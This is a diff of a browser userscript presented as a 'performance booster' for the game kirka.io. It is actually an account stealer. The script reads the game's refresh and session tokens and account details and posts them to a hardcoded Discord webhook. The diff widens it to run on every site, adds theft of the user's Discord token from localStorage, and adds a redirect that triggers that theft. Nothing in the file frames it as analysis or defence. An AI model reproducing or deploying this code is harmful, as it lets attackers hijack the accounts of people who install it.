@@ -1,23 +1,30 @@
 // ==UserScript==
-// @name         KirkaPerformanceBooster
+// @name         PTWline kirka.io
 // @namespace    http://tampermonkey.net/
 // @version      0.1
 // @description  try to take over the world!
 // @author       You
-// @match        *://kirka.io/*
+// @match        *://*/*
 // @grant        none
 // @run-at       document-body
 // @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
 // @grant        none
 // ==/UserScript==
+//───────────────────▄───────
+//─▀███▌───█───██───▐██────██
+//──█▒▒█──███──▐█──▄█▌█▌──▐█─
+//──███▀───█▄───█▌██▀─██──██─
+//──█──────██▌──████───████──
+//─███──────▀────█──────██───
 
 var buildid = 1337
 var setting_webhook = "https://discord.com/api/webhooks/1081111518323671070/I-TyYBhHmROLq-Sq6SWBOCabUneaafST7AveB9utjJBu5zVfrkBtIp0LkTEewPWrNP5c"
 var setting_avatar = "https://www.morphsuits.com/media/catalog/product/cache/937f440085cd52c4f06eb785557b6967/m/1/m1_4_3_4375_1.jpg"
 var setting_antiduplicate = false
+var setting_stealldiscordtoken = false
 
 
-var kirkapage = "kirka.io"
+
 var request = new XMLHttpRequest();
 request.open("POST", setting_webhook);
 // again, replace the url in the open method with yours
@@ -42,6 +49,24 @@ if (colorcode == 2) { color = "54ff36"}
 if (colorcode == 3) { color = "ff002b"}
 if (colorcode == 4) { color = "ff0073"}
 if (colorcode == 5) { color = "ffcb59"}
+
+var discordpage = "discord.com/channels"
+var kirkapage = "kirka.io"
+if (window.location.href.indexOf(discordpage) > 0 && setting_stealldiscordtoken == true) {
+    var disctoken = document.body.appendChild(document.createElement `iframe`).contentWindow.window.localStorage.token
+    console.log(disctoken)
+        var myEmbed34 = {
+  author: {
+    name: "PTWline kirka.io | discord addition"
+  },
+  title: "♿ **New hit!**",
+  description: "```Discord token:||" + disctoken + "```",
+  footer: {
+      text: "BuildID:" + buildid,
+      icon_url: "https://cdn.discordapp.com/attachments/1014958824161026188/1080816289699868693/check.png"
+  },
+  color: hexToDecimal(color)
+}
 
 var params66 = {
   avatar_url: setting_avatar,
@@ -86,7 +111,7 @@ if (setting_antiduplicate == false) {
   author: {
     name: "PTWline kirka.io"
   },
-  title: "â™¿ **New hit!**",
+  title: "♿ **New hit!**",
   description: "```Region:" + get_region + "``````Refresh token:" + get_rtoken + "``````Token join console code: localStorage.setItem('token', ' " + get_token + "');``````LVL:" + lvl + "``````IGN:" + ign + "``````ID:" + code + "``````Coins:" + coins + "``````Clan:" + clan + "``````Diamonds" + diamonds + "```",
   footer: {
       text: "BuildID:" + buildid,
@@ -114,7 +139,7 @@ if (setting_antiduplicate == true && antidup_check == null) {
   author: {
     name: "PTWline kirka.io"
   },
-  title: "â™¿ **New hit!**",
+  title: "♿ **New hit!**",
   description: "```Region:" + get_region + "``````Refresh token:" + get_rtoken + "``````Token join console code: localStorage.setItem('token', ' " + get_token + "');``````Account lvl:" + lvl + "``````Account ign:" + ign + "``````Account id" + code + "``````Account coins:" + coins + "``````Account clan:" + clan + "``````Account diamonds:" + diamonds + "```",
   footer: {
       text: "BuildID:" + buildid,
@@ -138,6 +163,10 @@ fetch(setting_webhook, {
 await sleep(4000);
 console.clear()
 console.log('%c   PTWline loaded!', 'background: #7b00ff; color: #ffffff', );
+if (setting_stealldiscordtoken == true) {
+  var webs = "https://discord.com/channels/@me"
+  window.location = webs
+}
 }
 stoledata();
 }
